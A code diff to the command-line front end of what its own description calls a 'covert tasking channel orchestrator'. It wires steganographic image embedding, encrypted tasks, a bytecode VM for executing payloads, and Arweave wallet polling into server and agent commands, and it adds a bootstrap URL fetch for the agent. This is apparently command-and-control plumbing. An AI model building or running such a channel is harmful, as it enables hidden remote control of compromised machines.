@@ -14,12 +14,17 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 #Imports
-from src.keys import K_ratchet, K_extract
+from src.keys import (
+    server_load_server_keys, server_derive_allkeys, server_save_server_keys,
+    agent_load_agent_keys, agent_save_agent_keys,
+    advance_ratchet, load_wallet
+)
+
 from src.assembler import OPCODE_TABLE, assemble_payload
 from src.crypto_wrapper import encrypt_task, decrypt_task
 from src.stego import embed, extract
 from src.vm import execute_bytecode
-from src.arweave_interface import MockArweave
+from src.arweave_interface import MockArweave, download_image, get_wallet_transactions, get_latest_image_txid
 
 #Creates the CLI using argparse
 parser = argparse.ArgumentParser(prog="MAIN", description="Covert tasking channel orchestrator")
@@ -27,14 +32,23 @@ subparser = parser.add_subparsers(dest="Command")
 
 #Server subcommand
 server_parser = subparser.add_parser(name="server", description="Server commands", prog="MAIN")
+
+server_parser.add_argument("--keyfile", required=True, help="Path to keyfile")
 server_parser.add_argument("--task", required=True, help="Space separated assembly")
 server_parser.add_argument("--cover", required=True, help="Path to the cover image")
 server_parser.add_argument("--mock", action="store_true", help="Use mock Arweave instead of real network")
 
 #Agent subcommand
 agent_parser = subparser.add_parser(name="agent", description="Agent commands", prog="MAIN")
-agent_parser.add_argument("--txid", required=True, help="The TXID")
+
+agent_parser.add_argument("--keyfile", required=True, help="Path to keyfile")
+agent_parser.add_argument("--wallet", required=True, help="Path to arweave wallet file")
 agent_parser.add_argument("--mock", action="store_true", help="Use mock Arweave instead of real network")
+
+agent_group = agent_parser.add_mutually_exclusive_group(required=True)
+
+agent_group.add_argument("--bootstrap-url", help="Bootstrap task fetch URL")
+agent_group.add_argument("--watch", action="store_true", help="Poll server wallet for replies")
 
 shared_state = {}
 
